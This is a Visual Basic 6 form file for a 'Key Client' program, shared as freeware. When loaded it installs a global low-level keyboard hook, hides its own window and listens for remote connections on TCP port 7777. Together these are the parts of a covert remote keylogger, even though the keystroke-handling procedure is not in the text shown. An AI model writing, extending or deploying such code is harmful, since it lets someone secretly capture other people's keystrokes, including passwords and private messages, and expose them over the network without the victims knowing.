VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "                    Key Client"
   ClientHeight    =   375
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   2505
   ControlBox      =   0   'False
   Icon            =   "keyclient.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   375
   ScaleWidth      =   2505
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command2 
      Caption         =   "&E X IT "
      Height          =   375
      Left            =   720
      TabIndex        =   0
      Top             =   0
      Width           =   1215
   End
   Begin MSWinsockLib.Winsock wscli 
      Left            =   240
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'************************************************
'     Coded by G.P.Prabu Kumar
' This a freeware. You can share,modify
' or even use in your own project.But
'don't forget to mail me:intelviper@yahoo.com
'************************************************

Dim hhkLowLevelKybd As Long
Public bctd As Boolean

Private Sub Command2_Click()
wscli.Close
UnhookWindowsHookEx hhkLowLevelKybd
End
End Sub

Private Sub Form_Load()
On Error GoTo er
wscli.LocalPort = 7777
wscli.Listen
hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf LowLevelKeyboardProc, App.hInstance, 0)
Me.WindowState = 1
Me.Hide
er:
If Err.Number <> 0 Then
MsgBox Err.Description, vbOKOnly, "Error: " & Err.Number
End
End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Cancel = True
wscli.Close
UnhookWindowsHookEx hhkLowLevelKybd
End
End Sub

Private Sub wscli_ConnectionRequest(ByVal requestID As Long)
If wscli.State <> sckClosed Then
wscli.Close
End If
wscli.Accept requestID
bctd = True
End Sub

